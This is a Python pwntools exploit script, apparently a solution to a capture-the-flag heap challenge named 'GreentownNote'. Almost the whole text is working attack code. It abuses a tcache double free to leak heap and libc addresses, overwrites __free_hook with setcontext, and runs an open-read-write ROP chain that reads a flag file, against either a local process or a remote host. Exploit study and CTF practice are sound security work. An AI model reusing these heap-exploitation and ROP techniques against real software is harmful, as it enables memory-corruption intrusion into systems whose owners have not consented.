#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/04 15:25:32
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess

arglen = len(sys.argv)
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda rv,data : io.sendafter(rv,data)
sl = lambda data : io.sendline(data)
sla = lambda rv,data : io.sendlineafter(rv,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
dbg = lambda point=null: (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og = lambda binary : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg = lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
setlibc = lambda leak,func : leak - libc.sym[func]
libcpath = lambda binary : subprocess.check_output(['ldd',binary]).decode().replace('\t', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep *.so'],shell=True).decode().replace('\n', '')
proc = lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})

# context.log_level='debug'
context.arch='amd64'
context.terminal = ['gnome-terminal','-x', 'bash','-c']
# 0直接略过所有dbg
DEBUG = 0
# 0表示使用当前目录下的libc，1表示使用patcher之后的glibc
GLIBC = 1
binary = './GreentownNote'
elf = ELF(binary)
libc = ELF(libcpath(binary))
libc.path = libcpath(binary)
io = proc(binary,libc.path) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def cmd(index):
    sla(":",str(index))

def add(size,content="a"):
    cmd(1)
    sla(":",str(size))
    sla(":",content)

def free(index):
    cmd(3)
    sla(":",str(index))

def show(index):
    cmd(2)
    sla(":",str(index))

add(0x100,b"cccc"*2)    # 0
add(0x100)              # 1
free(0)
free(0)
show(0)
ru(" Content: ")
chunk_addr = uu64(r(6))-0x250
leak("chunk_addr",chunk_addr)

add(0x100,p64(chunk_addr)) # 2->0
add(0x100,'a'*0x8)  # 2->0
add(0x100,'a'*0x28) # 3->first_chunk
free(3)
show(3)
ru(" Content: ")
libc.address = uu64(r(6)) - (0x7faec77b5ca0-0x7faec73ca000)
leak("base",libc.address)


read_addr = libc.sym['read']
open_addr = libc.sym['open']
puts_addr = libc.sym['puts']
free_hook = libc.sym["__free_hook"]
setcontext = libc.sym['setcontext'] + 53

ret = next(libc.search(asm('ret')))
syscall = next(libc.search(asm("syscall")))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
pop_rsi = next(libc.search(asm("pop rsi; ret")))
pop_rax_ret = next(libc.search(asm("pop rax; ret")))
pop_rdx_ret = next(libc.search(asm("pop rdx; ret")))
pop_rdx__rbx_ret = next(libc.search(asm("pop rdx; pop rbx; ret")))

flag_addr = free_hook + 0xf8

orw = flat(
    pop_rdi , flag_addr , pop_rsi , 0 , open_addr,
    pop_rdi , 3 , pop_rsi , flag_addr , pop_rdx__rbx_ret , 0x100 , 0 , read_addr,
    pop_rdi , flag_addr , puts_addr
)

add(0x240) # 3
free(0)
free(0)
add(0x100,p64(free_hook)) # 4->0
add(0x100)                # 4->0
add(0x100,(p64(setcontext)+orw+p64(0)*3+p64(free_hook+8)+p64(ret)).ljust(0xf8,b"b")+b"flag\x00") # 5
dbg()
free(5)
ia()